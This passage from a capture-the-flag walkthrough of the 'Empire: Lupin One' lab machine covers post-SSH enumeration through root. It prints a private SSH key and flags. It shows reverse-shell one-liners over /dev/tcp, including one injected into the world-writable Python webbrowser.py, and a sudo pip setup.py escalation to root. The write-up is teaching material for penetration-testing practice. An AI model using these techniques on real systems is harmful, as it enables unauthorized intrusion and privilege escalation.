ssh icex64@$RHOST -i sshKey
Enter passphrase for key &#39;sshKey&#39;: 
Linux LupinOne 5.10.0-8-amd64 #1 SMP Debian 5.10.46-5 (2021-09-23) x86_64
########################################
Welcome to Empire: Lupin One
########################################
Last login: Thu Oct  7 05:41:43 2021 from 192.168.26.4
icex64@LupinOne:~$ who
icex64   pts/0        2021-12-18 08:43 (192.168.56.70)
icex64@LupinOne:~$ id
uid=1001(icex64) gid=1001(icex64) groups=1001(icex64)
icex64@LupinOne:~$ hostname
LupinOne
icex64@LupinOne:~$ date
Sat 18 Dec 2021 08:43:36 AM EST
icex64@LupinOne:~$ whoami
icex64
icex64@LupinOne:~$</code></pre>
<figure>
<img src="22.ssh-login.png" alt="" /><figcaption>22.ssh-login</figcaption>
</figure>
<h2 id="post-ssh">Post SSH</h2>
<h3 id="etcpasswd">/etc/passwd</h3>
<pre class="shell"><code>icex64@LupinOne:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
arsene:x:1000:1000:arsene,,,:/home/arsene:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
icex64:x:1001:1001:,,,:/home/icex64:/bin/bash</code></pre>
<h3 id="homeicex64">/home/icex64</h3>
<pre class="shell"><code>icex64@LupinOne:~$ ls -lAhR
.:
total 32K
-rw------- 1 icex64 icex64  115 Oct  7 05:53 .bash_history
-rw-r--r-- 1 icex64 icex64  220 Oct  4 09:15 .bash_logout
-rw-r--r-- 1 icex64 icex64 3.5K Oct  4 09:15 .bashrc
drwxr-xr-x 3 icex64 icex64 4.0K Oct  4 09:51 .local
-rw-r--r-- 1 icex64 icex64  807 Oct  4 09:15 .profile
-rw------- 1 icex64 icex64   12 Oct  4 14:27 .python_history
drwx------ 2 icex64 icex64 4.0K Oct  4 18:06 .ssh
-rw-r--r-- 1 icex64 icex64 2.8K Oct  4 15:13 user.txt

./.local:
total 4.0K
drwx------ 3 icex64 icex64 4.0K Oct  4 09:51 share

./.local/share:
total 4.0K
drwx------ 2 icex64 icex64 4.0K Oct  4 09:51 nano

./.local/share/nano:
total 0

./.ssh:
total 12K
-rw-r--r-- 1 icex64 icex64 1.3K Oct  4 18:04 authorized_keys
-rw------- 1 icex64 icex64 3.4K Oct  4 18:01 id_rsa-aes256-cbc
-rw-r--r-- 1 icex64 icex64  741 Oct  4 18:01 id_rsa-aes256-cbc.pub</code></pre>
<h3 id="flag-user.txt">flag user.txt</h3>
<pre class="shell"><code>icex64@LupinOne:~$ cat user.txt
    ...,    ,...    ..,.   .,,  *&amp;@@@@@@@@@@&amp;/.    ,,,.   .,..    ...,    ...,  
    ,,,.    .,,,    *&amp;@@%%%%%%%%%%%%%%%%%%%%%%%%%%%&amp;@,.   ..,,    ,,,,    ,,,.  
..,.    ,..,  (@&amp;#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%&amp;%,.    ..,,    ,...    ..
    .... .@&amp;%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@  ....    ....    ,...  
    .,#@%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@  .,..    ,.,.    ...,  
.,,,&amp;%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@#@.,    .,.,    .,..    .,
...@%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%&amp;@####@*.    ..,,    ....    ,.
   @%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@@%#######@% .,.,    .,.,    .,.,  
..,,@@%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@@@@@@@@%#######@@,    ..,.    ,..,    ..
.,,, @@@@@@@@&amp;%%%%%%%%%%%%%&amp;@@@@@@@@@@@@@@@@@@@%%%#####@@,    .,,,    ,,.,    .,
    ..@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%###@@ .,..    ...,    ....  
...,  .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%#&amp;@.    ...,    ...,    ..
....   #@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%%@.    ....    ....    ..
    .,.,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&amp;%%%%%%%#@*.,.,    .,.,    ..@@@@
..,.    .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%#@@    ..,.    ,..*@&amp;&amp;@@.
.,,.    ,.@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%@@    .,,.    .@&amp;&amp;&amp;@( ,,
    ,.,.  .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&amp;%%%%%%%@@%%&amp;@@@, ,,,@&amp;@@@.,,,  
....    ...#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&amp;&amp;%%%%&amp;%,@%%%%%%%#@@@@@%..    ..
...,    ...,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&amp;&amp;&amp;&amp;@,*,,@%%%%%%@@@&amp;@%%@..    ..
    ,,.,    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/,***,*,@%%%@@&amp;@@@%%###@ ,,.,  
    .,. @@&amp;&amp;&amp;@@,,/@@@@@@@@@@@@@@@@@@@@@@@@#,,,,,,,,,*,,@%%%@&amp;&amp;@@%%%%%##&amp;* ,...  
.,,, @@&amp;@@&amp;@&amp;@@%,*,*,*,*,***,*,*,***,*,*,*,*,*,*,**,&amp;@%%&amp;@@@&amp;@%%%%%%%%@/.,    .,
  /@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@*,,,,,,,,,,,,,,,,,,,,,,*,,,**,%@&amp;%%%%@&amp;&amp;&amp;@%%%%%%%%%@(    ,..,  
 @&amp;@&amp;@&amp;@&amp;@&amp;@&amp;@&amp;&amp;@@@@@(,*,*,,**,*,*,,,*#&amp;@@&amp;%%%%%%%%&amp;@@@@@%%%%%%%%@&amp;..,    .,.,  
@@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@&amp;&amp;&amp;@@@@&amp;&amp;@@&amp;&amp;@&amp;&amp;&amp;%&amp;%%%%%%%@&amp;&amp;&amp;@&amp;%%%%%%&amp;@,..    ...,    ..
 @&amp;&amp;&amp;@&amp;@&amp;@&amp;@&amp;@&amp;@&amp;@&amp;@&amp;@&amp;@&amp;@&amp;@&amp;&amp;@@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;%&amp;%%%%&amp;@&amp;&amp;@@%%%#&amp;@%..,    .,.,    .,.,  
  @@@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;%%&amp;%@&amp;@&amp;@&amp;@@%..   ....    ....    ,..,  
.,,, *@@&amp;&amp;&amp;@&amp;@&amp;@&amp;@&amp;@&amp;@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;%&amp;&amp;@@&amp;&amp;@....    ,.,    .,,,    ,,..    .,
    ,,,,    .,%@@@@@@@@@@@@@@@@%,  ...,@@&amp;&amp;@(,,    ,,,.   .,,,    ,,.,    .,,.  
    .,.,    .,,,    .,,.   ..,.    ,*@@&amp;&amp;@ ,,,,    ,.,.   .,.,    .,.,    .,.,  
...,    ....    ....    ,..    ,..@@@&amp;@#,..    ....    ,..    ...,    ....    ..
    ....    ....    ...    ....@.,%&amp;@..    ....    ...    ....    ....    ....  
    ...,    ....    ....   .*/,...&amp;.,,,    ....    ....   .,..    ...,    ...,  
.,.,    .,.,    ,,.,    .,../*,,&amp;,,    ,.,,    ,.,,    ..,    .,.,    .,.,    ,,

3mp!r3{I_See_That_You_Manage_To_Get_My_Bunny}</code></pre>
<figure>
<img src="23.user-flag.png" alt="" /><figcaption>23.user-flag</figcaption>
</figure>
<h3 id="recent-files">recent files</h3>
<pre class="shell"><code>icex64@LupinOne:~$ find / -type f -not -path &quot;/proc/*&quot; -not -path &quot;/sys/*&quot; -and -mtime -1 -and -not -user root -exec ls -l &quot;{}&quot; \; 2&gt;/dev/null
---------- 1 icex64 icex64 0 Dec 18 08:43 /run/user/1001/systemd/inaccessible/reg</code></pre>
<h3 id="backups">backups</h3>
<pre class="shell"><code>icex64@LupinOne:~$ find / -type f -name &quot;*bak&quot; -exec ls -lh &quot;{}&quot; \; 2&gt;/dev/null
icex64@LupinOne:~$ find / -type f -name &quot;*backup*&quot; 2&gt;/dev/null
/usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
/usr/lib/modules/5.10.0-8-amd64/kernel/drivers/net/team/team_mode_activebackup.ko
icex64@LupinOne:~$ find / -type d -name &quot;*backup*&quot; 2&gt;/dev/null
/var/backups</code></pre>
<h3 id="sgid-and-suid-binaries">SGID and SUID binaries</h3>
<pre class="shell"><code>icex64@LupinOne:~$ find / -type f -perm -2000 -exec ls -la &quot;{}&quot; \; 2&gt;/dev/null
-rwxr-sr-x 1 root shadow 38912 Jul  9 12:55 /usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root tty 22760 Jul 28 15:09 /usr/bin/write.ul
-rwxr-sr-x 1 root shadow 80256 Feb  7  2020 /usr/bin/chage
-rwxr-sr-x 1 root crontab 43568 Feb 22  2021 /usr/bin/crontab
-rwxr-sr-x 1 root tty 35048 Jul 28 15:09 /usr/bin/wall
-rwxr-sr-x 1 root mail 23040 Feb  4  2021 /usr/bin/dotlockfile
-rwxr-sr-x 1 root ssh 354440 Mar 13  2021 /usr/bin/ssh-agent
-rwxr-sr-x 1 root shadow 31160 Feb  7  2020 /usr/bin/expiry

icex64@LupinOne:~$ find / -type f -perm -4000 -exec ls -la &quot;{}&quot; \; 2&gt;/dev/null
-rwsr-xr-x 1 root root 481608 Mar 13  2021 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 51336 Feb 21  2021 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 55528 Jul 28 15:09 /usr/bin/mount
-rwsr-xr-x 1 root root 71912 Jul 28 15:09 /usr/bin/su
-rwsr-xr-x 1 root root 35040 Jul 28 15:09 /usr/bin/umount
-rwsr-xr-x 1 root root 34896 Feb 26  2021 /usr/bin/fusermount
-rwsr-xr-x 1 root root 63960 Feb  7  2020 /usr/bin/passwd
-rwsr-xr-x 1 root root 52880 Feb  7  2020 /usr/bin/chsh
-rwsr-xr-x 1 root root 58416 Feb  7  2020 /usr/bin/chfn
-rwsr-xr-x 1 root root 182600 Feb 27  2021 /usr/bin/sudo
-rwsr-xr-x 1 root root 44632 Feb  7  2020 /usr/bin/newgrp
-rwsr-xr-x 1 root root 88304 Feb  7  2020 /usr/bin/gpasswd</code></pre>
<figure>
<img src="24.SGID-and-SUID-binaries.png" alt="" /><figcaption>24.SGID-and-SUID-binaries</figcaption>
</figure>
<h3 id="what-can-user-run-as-sudo">What can user run as sudo</h3>
<pre class="shell"><code>icex64@LupinOne:~$ sudo -l
Matching Defaults entries for icex64 on LupinOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User icex64 may run the following commands on LupinOne:
    (arsene) NOPASSWD: /usr/bin/python3.9 /home/arsene/heist.py</code></pre>
<figure>
<img src="25.sudo-el.png" alt="" /><figcaption>25.sudo-el</figcaption>
</figure>
<h3 id="ssh">.ssh</h3>
<pre class="shell"><code>icex64@LupinOne:~/.ssh$ ls
authorized_keys  id_rsa-aes256-cbc  id_rsa-aes256-cbc.pub
icex64@LupinOne:~/.ssh$ cat authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDcbYxVwdgE69Zb9eR7sxxn9GC+JM/bm7RPuLy5YEXQFr4U8ncLrlUpTXnpsySAI6zOcYQTkvVzNgtUJ6hFHlhJzEHw+bEdTzjw6SIFTEGDbLsLZi87vRhiXKpWBIs1GAyvABxm1LPuzyG2J/oYZXr2cajNpqV1Zuw0x0a/3hMJfYb0iNH+ZJZfeDQnNKK12/wDFUGK6vck8UBxmSj+TZaLZuKgr71GpJ6mhB7kslVSW+VxJU8PEzhq4BRHenx6B7G8x6bxUAHY/rHt+kNysuS4xouU09rsyUgZ2YUOsZFE+su1+tfHmUACZVeOl63WO8F5x9kDrf6pSjDX9SRCroBvBPe9S0c7W0EB1SIZV+yM6OyDv91pzf805mmrtTpWzcdnmA5O06zN910mHRRECeSaUwGAv+v8OxNocv0oDj2CD9418rMsuitxYoHDC0fDNeobBLEkgZTZzUbXAYonkA9cABTAqP6TzngbLVRkdmUrjpe5sFKEG5qWxLyzOLcaEKE= icex64@LupinOne

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDBzHjzJcvk9GXiytplgT9z/mP91NqOU9QoAwop5JNxhEfm/j5KQmdj/JB7sQ1hBotONvqaAdmsK+OYL9H6NSb0jMbMc4soFrBinoLEkx894B/PqUTODesMEV/aK22UKegdwlJ9Arf+1Y48V86gkzS6xzoKn/ExVkApsdimIRvGhsv4ZMmMZEkTIoTEGz7raD7QHDEXiusWl0hkh33rQZCrFsZFT7J0wKgLrX2pmoMQC6o42OQJaNLBzTxCY6jU2BDQECoVuRPL7eJa0/nRfCaOrIzPfZ/NNYgu/Dlf1CmbXEsCVmlD71cbPqwfWKGf3hWeEr0WdQhEuTf5OyDICwUbg0dLiKz4kcskYcDzH0ZnaDsmjoYv2uLVLi19jrfnp/tVoLbKm39ImmV6Jubj6JmpHXewewKiv6z1nNE8mkHMpY5Ihe0cLdyv316bFI8O+3y5m3gPIhUUk78C5n0VUOPSQMsx56d+B9H2bFiI2lo18mTFawa0pfXdcBVXZkouX3nlZB1/Xoip71LH3kPI7U7fPsz5EyFIPWIaENsRmznbtY9ajQhbjHAjFClAhzXJi4LGZ6mjaGEil+9g4U7pjtEAqYv1+3x8F+zuiZsVdMr/66Ma4e6iwPLqmtzt3UiFGb4Ie1xaWQf7UnloKUyjLvMwBbb3gRYakBbQApoONhGoYQ== icex64@LupinOne
icex64@LupinOne:~/.ssh$ cat id_rsa-aes256-cbc
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jYmMAAAAGYmNyeXB0AAAAGAAAABDy33c2Fp
PBYANne4oz3usGAAAAEAAAAAEAAAIXAAAAB3NzaC1yc2EAAAADAQABAAACAQDBzHjzJcvk
9GXiytplgT9z/mP91NqOU9QoAwop5JNxhEfm/j5KQmdj/JB7sQ1hBotONvqaAdmsK+OYL9
H6NSb0jMbMc4soFrBinoLEkx894B/PqUTODesMEV/aK22UKegdwlJ9Arf+1Y48V86gkzS6
xzoKn/ExVkApsdimIRvGhsv4ZMmMZEkTIoTEGz7raD7QHDEXiusWl0hkh33rQZCrFsZFT7
J0wKgLrX2pmoMQC6o42OQJaNLBzTxCY6jU2BDQECoVuRPL7eJa0/nRfCaOrIzPfZ/NNYgu
/Dlf1CmbXEsCVmlD71cbPqwfWKGf3hWeEr0WdQhEuTf5OyDICwUbg0dLiKz4kcskYcDzH0
ZnaDsmjoYv2uLVLi19jrfnp/tVoLbKm39ImmV6Jubj6JmpHXewewKiv6z1nNE8mkHMpY5I
he0cLdyv316bFI8O+3y5m3gPIhUUk78C5n0VUOPSQMsx56d+B9H2bFiI2lo18mTFawa0pf
XdcBVXZkouX3nlZB1/Xoip71LH3kPI7U7fPsz5EyFIPWIaENsRmznbtY9ajQhbjHAjFClA
hzXJi4LGZ6mjaGEil+9g4U7pjtEAqYv1+3x8F+zuiZsVdMr/66Ma4e6iwPLqmtzt3UiFGb
4Ie1xaWQf7UnloKUyjLvMwBbb3gRYakBbQApoONhGoYQAAB1BkuFFctACNrlDxN180vczq
mXXs+ofdFSDieiNhKCLdSqFDsSALaXkLX8DFDpFY236qQE1poC+LJsPHJYSpZOr0cGjtWp
MkMcBnzD9uynCjhZ9ijaPY/vMY7mtHZNCY8SeoWAxYXToKy2cu/+pVyGQ76KYt3J0AT7wA
2OR3aMMk0o1LoozuyvOrB3cXMHh75zBfgQyAeeD7LyYG/b7z6zGvVxZca/g572CXxXSXlb
QOw/AR8ArhAP4SJRNkFoV2YRCe38WhQEp4R6k+34tK+kUoEaVAbwU+IchYyM8ZarSvHVpE
vFUPiANSHCZ/b+pdKQtBzTk5/VH/Jk3QPcH69EJyx8/gRE/glQY6z6nC6uoG4AkIl+gOxZ
0hWJJv0R1Sgrc91mBVcYwmuUPFRB5YFMHDWbYmZ0IvcZtUxRsSk2/uWDWZcW4tDskEVPft
rqE36ftm9eJ/nWDsZoNxZbjo4cF44PTF0WU6U0UsJW6mDclDko6XSjCK4tk8vr4qQB8OLB
QMbbCOEVOOOm9ru89e1a+FCKhEPP6LfwoBGCZMkqdOqUmastvCeUmht6a1z6nXTizommZy
x+ltg9c9xfeO8tg1xasCel1BluIhUKwGDkLCeIEsD1HYDBXb+HjmHfwzRipn/tLuNPLNjG
nx9LpVd7M72Fjk6lly8KUGL7z95HAtwmSgqIRlN+M5iKlB5CVafq0z59VB8vb9oMUGkCC5
VQRfKlzvKnPk0Ae9QyPUzADy+gCuQ2HmSkJTxM6KxoZUpDCfvn08Txt0dn7CnTrFPGIcTO
cNi2xzGu3wC7jpZvkncZN+qRB0ucd6vfJ04mcT03U5oq++uyXx8t6EKESa4LXccPGNhpfh
nEcgvi6QBMBgQ1Ph0JSnUB7jjrkjqC1q8qRNuEcWHyHgtc75JwEo5ReLdV/hZBWPD8Zefm
8UytFDSagEB40Ej9jbD5GoHMPBx8VJOLhQ+4/xuaairC7s9OcX4WDZeX3E0FjP9kq3QEYH
zcixzXCpk5KnVmxPul7vNieQ2gqBjtR9BA3PqCXPeIH0OWXYE+LRnG35W6meqqQBw8gSPw
n49YlYW3wxv1G3qxqaaoG23HT3dxKcssp+XqmSALaJIzYlpnH5Cmao4eBQ4jv7qxKRhspl
AbbL2740eXtrhk3AIWiaw1h0DRXrm2GkvbvAEewx3sXEtPnMG4YVyVAFfgI37MUDrcLO93
oVb4p/rHHqqPNMNwM1ns+adF7REjzFwr4/trZq0XFkrpCe5fBYH58YyfO/g8up3DMxcSSI
63RqSbk60Z3iYiwB8iQgortZm0UsQbzLj9i1yiKQ6OekRQaEGxuiIUA1SvZoQO9NnTo0SV
y7mHzzG17nK4lMJXqTxl08q26OzvdqevMX9b3GABVaH7fsYxoXF7eDsRSx83pjrcSd+t0+
t/YYhQ/r2z30YfqwLas7ltoJotTcmPqII28JpX/nlpkEMcuXoLDzLvCZORo7AYd8JQrtg2
Ays8pHGynylFMDTn13gPJTYJhLDO4H9+7dZy825mkfKnYhPnioKUFgqJK2yswQaRPLakHU
yviNXqtxyqKc5qYQMmlF1M+fSjExEYfXbIcBhZ7gXYwalGX7uX8vk8zO5dh9W9SbO4LxlI
8nSvezGJJWBGXZAZSiLkCVp08PeKxmKN2S1TzxqoW7VOnI3jBvKD3IpQXSsbTgz5WB07BU
mUbxCXl1NYzXHPEAP95Ik8cMB8MOyFcElTD8BXJRBX2I6zHOh+4Qa4+oVk9ZluLBxeu22r
VgG7l5THcjO7L4YubiXuE2P7u77obWUfeltC8wQ0jArWi26x/IUt/FP8Nq964pD7m/dPHQ
E8/oh4V1NTGWrDsK3AbLk/MrgROSg7Ic4BS/8IwRVuC+d2w1Pq+X+zMkblEpD49IuuIazJ
BHk3s6SyWUhJfD6u4C3N8zC3Jebl6ixeVM2vEJWZ2Vhcy+31qP80O/+Kk9NUWalsz+6Kt2
yueBXN1LLFJNRVMvVO823rzVVOY2yXw8AVZKOqDRzgvBk1AHnS7r3lfHWEh5RyNhiEIKZ+
wDSuOKenqc71GfvgmVOUypYTtoI527fiF/9rS3MQH2Z3l+qWMw5A1PU2BCkMso060OIE9P
5KfF3atxbiAVii6oKfBnRhqM2s4SpWDZd8xPafktBPMgN97TzLWM6pi0NgS+fJtJPpDRL8
vTGvFCHHVi4SgTB64+HTAH53uQC5qizj5t38in3LCWtPExGV3eiKbxuMxtDGwwSLT/DKcZ
Qb50sQsJUxKkuMyfvDQC9wyhYnH0/4m9ahgaTwzQFfyf7DbTM0+sXKrlTYdMYGNZitKeqB
1bsU2HpDgh3HuudIVbtXG74nZaLPTevSrZKSAOit+Qz6M2ZAuJJ5s7UElqrLliR2FAN+gB
ECm2RqzB3Huj8mM39RitRGtIhejpsWrDkbSzVHMhTEz4tIwHgKk01BTD34ryeel/4ORlsC
iUJ66WmRUN9EoVlkeCzQJwivI=
-----END OPENSSH PRIVATE KEY-----
icex64@LupinOne:~/.ssh$ cat id_rsa-aes256-cbc.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDBzHjzJcvk9GXiytplgT9z/mP91NqOU9QoAwop5JNxhEfm/j5KQmdj/JB7sQ1hBotONvqaAdmsK+OYL9H6NSb0jMbMc4soFrBinoLEkx894B/PqUTODesMEV/aK22UKegdwlJ9Arf+1Y48V86gkzS6xzoKn/ExVkApsdimIRvGhsv4ZMmMZEkTIoTEGz7raD7QHDEXiusWl0hkh33rQZCrFsZFT7J0wKgLrX2pmoMQC6o42OQJaNLBzTxCY6jU2BDQECoVuRPL7eJa0/nRfCaOrIzPfZ/NNYgu/Dlf1CmbXEsCVmlD71cbPqwfWKGf3hWeEr0WdQhEuTf5OyDICwUbg0dLiKz4kcskYcDzH0ZnaDsmjoYv2uLVLi19jrfnp/tVoLbKm39ImmV6Jubj6JmpHXewewKiv6z1nNE8mkHMpY5Ihe0cLdyv316bFI8O+3y5m3gPIhUUk78C5n0VUOPSQMsx56d+B9H2bFiI2lo18mTFawa0pfXdcBVXZkouX3nlZB1/Xoip71LH3kPI7U7fPsz5EyFIPWIaENsRmznbtY9ajQhbjHAjFClAhzXJi4LGZ6mjaGEil+9g4U7pjtEAqYv1+3x8F+zuiZsVdMr/66Ma4e6iwPLqmtzt3UiFGb4Ie1xaWQf7UnloKUyjLvMwBbb3gRYakBbQApoONhGoYQ== icex64@LupinOne</code></pre>
<h3 id="homearsene">/home/arsene</h3>
<pre class="shell"><code>icex64@LupinOne:~$ cd ../arsene/
icex64@LupinOne:/home/arsene$ ls
heist.py  note.txt
icex64@LupinOne:/home/arsene$ ls -la
total 40
drwxr-xr-x 3 arsene arsene 4096 Oct  4 18:46 .
drwxr-xr-x 4 root   root   4096 Oct  4 09:15 ..
-rw------- 1 arsene arsene   47 Oct  4 18:47 .bash_history
-rw-r--r-- 1 arsene arsene  220 Oct  4 08:03 .bash_logout
-rw-r--r-- 1 arsene arsene 3526 Oct  4 08:03 .bashrc
-rw-r--r-- 1 arsene arsene  118 Oct  4 14:16 heist.py
drwxr-xr-x 3 arsene arsene 4096 Oct  4 12:37 .local
-rw-r--r-- 1 arsene arsene  339 Oct  4 15:07 note.txt
-rw-r--r-- 1 arsene arsene  807 Oct  4 08:03 .profile
-rw------- 1 arsene arsene   67 Oct  4 14:32 .secret

icex64@LupinOne:/home/arsene$ cat note.txt 
Hi my friend Icex64,

Can you please help check if my code is secure to run, I need to use for my next heist.

I dont want to anyone else get inside it, because it can compromise my account and find my secret file.

Only you have access to my program, because I know that your account is secure.

See you on the other side.

Arsene Lupin.

icex64@LupinOne:/home/arsene$ cat heist.py 
import webbrowser

print (&quot;Its not yet ready to get in action&quot;)

webbrowser.open(&quot;https://empirecybersecurity.co.mz&quot;)</code></pre>
<p>But I cannot modify the heist file. What about the webbrowser?</p>
<h3 id="beginning-of-the-end">Beginning of the end</h3>
<figure>
<img src="26.webbrowser-py-is-world-writable.png" alt="" /><figcaption>26.webbrowser-py-is-world-writable</figcaption>
</figure>
<figure>
<img src="27.reverse-shell.png" alt="" /><figcaption>27.reverse-shell</figcaption>
</figure>
<h4 id="could-not-catch-a-reverse-shell">Could not catch a reverse shell</h4>
<pre class="shell"><code>icex64@LupinOne:/home/arsene$ sudo -u arsene python3.9 /home/arsene/heist.py 
sh: 1: Syntax error: Bad fd number
Its not yet ready to get in action
icex64@LupinOne:/home/arsene$ vi /home/arsene/heist.py 
icex64@LupinOne:/home/arsene$ vi /usr/lib/python3.9/webbrowser.py 
icex64@LupinOne:/home/arsene$ sudo -u arsene python3.9 /home/arsene/heist.py 
/bin/bash: connect: Connection refused
/bin/bash: line 1: /dev/tcp/192.168.56.70/443: Connection refused
Its not yet ready to get in action
icex64@LupinOne:/home/arsene$ bash -i &gt;&amp; /dev/tcp/192.168.56.70/443 0&gt;&amp;1
-bash: connect: Connection refused
-bash: /dev/tcp/192.168.56.70/443: Connection refused
icex64@LupinOne:/home/arsene$ bash -i &gt;&amp; /dev/tcp/192.168.56.70/9999 0&gt;&amp;1
-bash: connect: Connection refused
-bash: /dev/tcp/192.168.56.70/9999: Connection refused
icex64@LupinOne:/home/arsene$ head -n10 /usr/lib/python3.9/webbrowser.py 
#! /usr/bin/env python3
&quot;&quot;&quot;Interfaces for launching and remotely controlling Web browsers.&quot;&quot;&quot;
# Maintained by Georg Brandl.

import os
os.system(&quot;/bin/bash -c &#39;/bin/bash -i &gt;&amp; /dev/tcp/192.168.56.70/443 0&gt;&amp;1&#39;&quot;);
import shlex
import shutil
import sys
import subprocess
</code></pre>
<h4 id="change-to-bash">Change to bash</h4>
<pre class="shell"><code>arsene@LupinOne:~$ head -n10 /usr/lib/python3.9/webbrowser.py
#! /usr/bin/env python3
&quot;&quot;&quot;Interfaces for launching and remotely controlling Web browsers.&quot;&quot;&quot;
# Maintained by Georg Brandl.

import os
os.system(&quot;/bin/bash -pli&quot;)
import shlex
import shutil
import sys
import subprocess</code></pre>
<h4 id="become-user-arsene">become user arsene</h4>
<pre class="shell"><code>icex64@LupinOne:/home/arsene$ sudo -u arsene python3.9 /home/arsene/heist.py 
arsene@LupinOne:~$ whoami
arsene
arsene@LupinOne:~$ id
uid=1000(arsene) gid=1000(arsene) groups=1000(arsene),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
arsene@LupinOne:~$ who
icex64   pts/0        2021-12-18 08:43 (192.168.56.70)
arsene@LupinOne:~$ hostname
LupinOne
arsene@LupinOne:~$ date
Sat 18 Dec 2021 09:14:23 AM EST
arsene@LupinOne:~$ sudo -l
Matching Defaults entries for arsene on LupinOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User arsene may run the following commands on LupinOne:
    (root) NOPASSWD: /usr/bin/pip
</code></pre>
<figure>
<img src="28.become-user-arsene.png" alt="" /><figcaption>28.become-user-arsene</figcaption>
</figure>
<h3 id="sudo-pip">sudo pip</h3>
<pre class="shell"><code># https://gtfobins.github.io/gtfobins/pip/
arsene@LupinOne:~$ TF=$(mktemp -d)
arsene@LupinOne:~$ echo &quot;import os; os.execl(&#39;/bin/sh&#39;, &#39;sh&#39;, &#39;-c&#39;, &#39;sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#39;)&quot; &gt; $TF/setup.py
arsene@LupinOne:~$ sudo pip install $TF
Processing /tmp/tmp.fzVpVJEUa0
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
# who
icex64   pts/0        2021-12-18 08:43 (192.168.56.70)
# date
Sat 18 Dec 2021 09:17:07 AM EST</code></pre>
<figure>
<img src="29.sudo-pip-to-root.png" alt="" /><figcaption>29.sudo-pip-to-root</figcaption>
</figure>
<h2 id="rooted">Rooted</h2>
<h3 id="flag-rootroot.txt">flag /root/root.txt</h3>
<pre class="shell"><code>root@LupinOne:/tmp/pip-req-build-fkw7yj7m# cd /root
root@LupinOne:~# ls
root.txt
root@LupinOne:~# ls -la
total 36
drwx------  4 root root 4096 Oct  7 05:53 .
drwxr-xr-x 18 root root 4096 Oct  4 07:44 ..
-rw-------  1 root root  234 Oct  7 05:53 .bash_history
